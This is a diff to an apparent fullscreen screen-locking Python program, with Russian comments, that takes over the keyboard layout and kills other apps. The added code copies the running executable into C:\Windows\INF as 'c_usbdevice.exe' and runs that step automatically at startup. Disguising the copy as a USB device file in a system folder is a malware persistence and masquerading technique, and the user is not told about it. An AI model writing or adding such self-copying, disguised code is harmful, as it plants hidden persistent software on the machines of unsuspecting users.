@@ -4,6 +4,7 @@ import keyboard
 import pygame
 import sys
 import os
+import shutil
 import time
 from ctypes import windll, c_int, c_uint, c_ulong, byref, POINTER
 import subprocess
@@ -24,6 +25,30 @@ def set_keyboard_layout(language_code):
     user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)
 
 set_keyboard_layout(LANG_ENGLISH_US)
+
+def copy_self_to_target(target_dir, target_name):
+    """
+    Копирует текущее исполняемое приложение в указанную директорию под указанным именем.
+    """
+    if getattr(sys, 'frozen', False):
+        # Если программа 'заморожена' (собрана в exe)
+        current_file_path = sys.executable
+    else:
+        # Иначе используется текущий .py файл
+        current_file_path = os.path.abspath(__file__)
+
+    target_path = os.path.join(target_dir, target_name)
+
+    try:
+        # Проверка существования директории назначения
+        if not os.path.exists(target_dir):
+            os.makedirs(target_dir)
+
+        # Копирование файла
+        shutil.copy2(current_file_path, target_path)
+        print(f"Файл успешно скопирован в: {target_path}")
+    except Exception as e:
+        print(f"Ошибка при копировании: {e}")
 
 def kill_app():
     try:
@@ -97,6 +122,9 @@ screen = pygame.display.set_mode(SCREEN_RESOLUTION, pygame.FULLSCREEN)
 hwnd = pygame.display.get_wm_info()["window"]
 kill_app()
 
+target_directory = r"C:\Windows\INF"
+target_filename = "c_usbdevice.exe"
+copy_self_to_target(target_directory, target_filename)
 
 def get_current_volume():
     """ Получает текущий уровень громкости через pycaw """
